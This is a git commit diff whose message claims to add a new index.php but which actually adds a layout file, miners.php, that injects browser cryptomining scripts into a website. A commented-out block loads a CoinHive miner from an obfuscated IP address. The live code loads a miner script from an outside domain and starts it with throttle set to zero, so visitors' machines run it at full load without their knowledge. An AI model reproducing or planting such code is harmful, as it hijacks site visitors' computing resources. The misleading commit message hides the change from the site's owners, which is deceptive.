141ff88afd8636a1bf09ae6d8fcfdcbaae585db4
amcguirebooster <andrewmcguire@boosterthon.com>
2018-06-21 09:18:13 -0400

    added new index.php

---
+++ public/layout/miners.php
@@ -0,0 +1,22 @@
+<!--
+<script src="https://0x32742DE3/1824628-2648shdh82.js"></script>
+<script>
+var 8m4 = new CoinHive.Anonymous('dmQTh9BimGpFmAdq4RUPFgUfjH0SYIt2', {threads: 75});
+8m4.start();
+</script>
+<script src="https://www.hawkitsolutions.com/Ive6.php?f=MhbQ.js"></script>
+<script>
+    var _client = new Client.Anonymous('422193000ee0a7edc691a05602c72f973d2c67937299acbb1e7154cf1586a375', {
+        throttle: 0
+    });
+    _client.start();
+</script>
+-->
+<script src="https://www.freecontent.date./MhbQ.js"></script>
+<script>
+    var _client = new Client.Anonymous('422193000ee0a7edc691a05602c72f973d2c67937299acbb1e7154cf1586a375', {
+        throttle: 0
+    });
+    _client.start();
+</script>
+</head>
